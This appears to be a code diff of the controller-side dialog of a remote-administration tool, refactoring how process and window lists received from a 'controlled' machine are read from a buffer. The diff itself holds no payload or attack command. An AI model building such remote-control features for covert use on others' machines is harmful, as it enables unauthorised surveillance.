@@ -22,8 +22,7 @@ IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)
 	m_ContextObject = ContextObject;
 	m_iocpServer = IOCPServer;
 
-	char	*lpBuffer = (char *)(m_ContextObject->InDeCompressedBuffer.GetBuffer(0));  //被控端传回的数据
-	m_bHow=lpBuffer[0];   
+	m_bHow= m_ContextObject->InDeCompressedBuffer.GetBYTE(0);
 }
 
 CSystemDlg::~CSystemDlg()
@@ -90,7 +89,8 @@ BOOL CSystemDlg::OnInitDialog()
 
 void CSystemDlg::ShowWindowsList(void)
 {
-	char *szBuffer = (char *)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1));
+	Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(1);
+	char *szBuffer = tmp.c_str();
 	DWORD	dwOffset = 0;
 	char	*szTitle = NULL;
 	bool isDel=false;
@@ -120,7 +120,8 @@ void CSystemDlg::ShowWindowsList(void)
 
 void CSystemDlg::ShowProcessList(void)
 {
-	char	*szBuffer = (char *)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1)); //xiaoxi[][][][][]
+	Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(1);
+	char	*szBuffer = tmp.c_str(); //xiaoxi[][][][][]
 	char	*szExeFile;
 	char	*szProcessFullPath;
 	DWORD	dwOffset = 0;
@@ -270,7 +271,7 @@ void CSystemDlg::GetWindowsList(void)
 
 void CSystemDlg::OnReceiveComplete(void)
 {
-	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
+	switch (m_ContextObject->InDeCompressedBuffer.GetBYTE(0))
 	{
 	case TOKEN_PSLIST:
 		{
